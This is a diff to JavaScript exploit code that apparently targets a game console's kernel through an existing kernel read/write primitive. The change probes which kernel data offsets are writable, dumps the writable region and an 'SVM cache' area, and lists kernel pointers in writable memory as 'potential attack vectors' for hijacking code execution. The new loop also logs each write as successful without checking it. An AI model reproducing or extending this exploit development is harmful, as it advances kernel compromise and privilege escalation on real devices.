@@ -736,83 +736,104 @@ async function main(userlandRW, wkOnly = false) {
                 // =========================================================================
 
                 let doWriteTest = confirm(
-                    "BOUNDARY SEARCH\n\n" +
-                    "We now know:\n" +
-                    "- 0x4bf0 (19KB) = WRITABLE\n" +
-                    "- 0x170650 (1.5MB) = CRASHES\n" +
-                    "- 0xD11D08 (13.7MB) = CRASHES\n\n" +
-                    "Find the exact boundary where writes fail?\n" +
-                    "Tests incrementally: 20KB, 24KB, 32KB, 64KB...\n\n" +
-                    "You confirm each test before it runs.\n\n" +
-                    "OK = Start boundary search\n" +
+                    "WRITABLE REGION ANALYSIS\n\n" +
+                    "CONFIRMED BOUNDARY:\n" +
+                    "- 0x0 to 0x8000 = WRITABLE (~32KB)\n" +
+                    "- 0x10000+ = WRITE PROTECTED\n\n" +
+                    "This will:\n" +
+                    "1. Optionally find exact boundary (0x9000-0xF000)\n" +
+                    "2. Scan writable region for kernel pointers\n" +
+                    "3. Dump SVM cache area\n\n" +
+                    "OK = Analyze writable region\n" +
                     "Cancel = Skip"
                 );
 
                 if (doWriteTest) {
-                    // We now know:
-                    // - 0x4bf0 WORKS
-                    // - 0x170650 CRASHES
-                    // Find the boundary with incremental tests
+                    // KNOWN BOUNDARY: 0x8000 works, 0x10000 crashes
+                    // Writable region is approximately 32KB-64KB from kdataBase
 
-                    await log("[BOUNDARY] Finding write protection boundary...", LogLevel.WARN);
-                    await log("[BOUNDARY] Known: 0x4bf0 works, 0x170650 crashes", LogLevel.INFO);
+                    await log("[BOUNDARY] === CONFIRMED RESULTS ===", LogLevel.SUCCESS);
+                    await log("[BOUNDARY] 0x5000 (20KB) = WRITABLE", LogLevel.SUCCESS);
+                    await log("[BOUNDARY] 0x6000 (24KB) = WRITABLE", LogLevel.SUCCESS);
+                    await log("[BOUNDARY] 0x8000 (32KB) = WRITABLE", LogLevel.SUCCESS);
+                    await log("[BOUNDARY] 0x10000 (64KB) = CRASHES", LogLevel.ERROR);
+                    await log("[BOUNDARY] Boundary is between 0x8000-0x10000", LogLevel.WARN);
 
-                    // Test at increasing intervals - user confirms each
-                    const testOffsets = [
-                        { off: 0x5000, desc: "20KB" },
-                        { off: 0x6000, desc: "24KB" },
-                        { off: 0x8000, desc: "32KB" },
-                        { off: 0x10000, desc: "64KB" },
-                        { off: 0x20000, desc: "128KB" },
-                        { off: 0x40000, desc: "256KB" },
-                        { off: 0x80000, desc: "512KB" },
-                        { off: 0x100000, desc: "1MB" },
-                    ];
+                    // Fine-grained search between 0x8000 and 0x10000
+                    let doFineSearch = confirm(
+                        "FINE BOUNDARY SEARCH\n\n" +
+                        "Boundary is between 0x8000-0x10000.\n\n" +
+                        "Test at 0x1000 intervals to find exact boundary?\n" +
+                        "(0x9000, 0xA000, 0xB000, etc.)\n\n" +
+                        "OK = Find exact boundary\n" +
+                        "Cancel = Skip to memory dump"
+                    );
 
-                    let lastGoodOffset = 0x4bf0;
+                    let exactBoundary = 0x8000;
 
-                    for (let test of testOffsets) {
-                        let addr = krw.kdataBase.add32(test.off);
-                        let val = await krw.read4(addr);
+                    if (doFineSearch) {
+                        const fineOffsets = [0x9000, 0xA000, 0xB000, 0xC000, 0xD000, 0xE000, 0xF000];
 
-                        let doTest = confirm(
-                            "BOUNDARY TEST: 0x" + test.off.toString(16) + " (" + test.desc + ")\n\n" +
-                            "Current value: 0x" + val.toString(16) + "\n" +
-                            "Last good offset: 0x" + lastGoodOffset.toString(16) + "\n\n" +
-                            "Test write here? (writes same value back)\n\n" +
-                            "OK = Test (may crash!)\n" +
-                            "Cancel = STOP testing"
-                        );
+                        for (let off of fineOffsets) {
+                            let addr = krw.kdataBase.add32(off);
+                            let val = await krw.read4(addr);
 
-                        if (!doTest) {
-                            await log("[BOUNDARY] Stopped at user request", LogLevel.INFO);
-                            break;
-                        }
+                            let doTest = confirm(
+                                "Test write at 0x" + off.toString(16) + "?\n\n" +
+                                "Value: 0x" + val.toString(16) + "\n" +
+                                "Last good: 0x" + exactBoundary.toString(16) + "\n\n" +
+                                "OK = Test\nCancel = Stop"
+                            );
 
-                        await log("[BOUNDARY] Testing 0x" + test.off.toString(16) + "...", LogLevel.WARN);
-                        await krw.write4(addr, val);
-                        let verify = await krw.read4(addr);
+                            if (!doTest) break;
 
-                        if (verify === val) {
-                            await log("[BOUNDARY] 0x" + test.off.toString(16) + " = WRITABLE!", LogLevel.SUCCESS);
-                            lastGoodOffset = test.off;
-                        } else {
-                            await log("[BOUNDARY] 0x" + test.off.toString(16) + " value changed!", LogLevel.WARN);
+                            await log("[FINE] Testing 0x" + off.toString(16) + "...", LogLevel.WARN);
+                            await krw.write4(addr, val);
+                            await log("[FINE] 0x" + off.toString(16) + " = WRITABLE!", LogLevel.SUCCESS);
+                            exactBoundary = off;
                         }
                     }
 
-                    await log("[BOUNDARY] === RESULTS ===", LogLevel.SUCCESS);
-                    await log("[BOUNDARY] Last confirmed writable: 0x" + lastGoodOffset.toString(16), LogLevel.SUCCESS);
+                    await log("[BOUNDARY] Exact boundary: ~0x" + exactBoundary.toString(16), LogLevel.SUCCESS);
 
-                    // Scan the writable region for interesting data
-                    await log("[SCAN] Dumping writable region for analysis...", LogLevel.WARN);
+                    // Now dump the ENTIRE writable region to find useful structures
+                    await log("========== WRITABLE REGION DUMP ==========", LogLevel.SUCCESS);
+                    await log("[DUMP] Scanning 0x0 to 0x" + (exactBoundary + 0x1000).toString(16) + " for structures...", LogLevel.WARN);
 
-                    for (let off = 0x4000; off <= lastGoodOffset + 0x1000; off += 0x100) {
-                        let vals = [];
-                        for (let i = 0; i < 4; i++) {
-                            vals.push(await krw.read8(krw.kdataBase.add32(off + i * 8)));
+                    // Look for function pointers (values in kernel range 0xffffffff8xxxxxxx)
+                    let foundPointers = [];
+
+                    for (let off = 0; off < exactBoundary + 0x1000; off += 8) {
+                        let val = await krw.read8(krw.kdataBase.add32(off));
+
+                        // Check if it looks like a kernel pointer
+                        if (val.hi === 0xffffffff && (val.low & 0x80000000)) {
+                            foundPointers.push({ offset: off, value: val });
+                            await log("[PTR] 0x" + off.toString(16) + ": " + val + " (potential kernel pointer!)", LogLevel.WARN);
                         }
-                        await log("0x" + off.toString(16) + ": " + vals.join(" | "), LogLevel.INFO);
+                    }
+
+                    await log("[DUMP] Found " + foundPointers.length + " potential kernel pointers in writable region", LogLevel.SUCCESS);
+
+                    // Also dump the SVM cache area specifically
+                    await log("[SVM] Dumping SVM cache region (0x4b00-0x5000):", LogLevel.INFO);
+                    for (let off = 0x4b00; off < 0x5000; off += 0x20) {
+                        let line = "0x" + off.toString(16) + ":";
+                        for (let i = 0; i < 4; i++) {
+                            let v = await krw.read4(krw.kdataBase.add32(off + i * 4));
+                            line += " " + v.toString(16).padStart(8, '0');
+                        }
+                        await log(line, LogLevel.INFO);
+                    }
+
+                    if (foundPointers.length > 0) {
+                        await log("========== POTENTIAL ATTACK VECTORS ==========", LogLevel.SUCCESS);
+                        await log("[ANALYSIS] Found kernel pointers in WRITABLE memory!", LogLevel.WARN);
+                        await log("[ANALYSIS] These could potentially be hijacked for code execution", LogLevel.WARN);
+
+                        for (let ptr of foundPointers) {
+                            await log("[TARGET] Offset 0x" + ptr.offset.toString(16) + " = " + ptr.value, LogLevel.WARN);
+                        }
                     }
                 }
             }
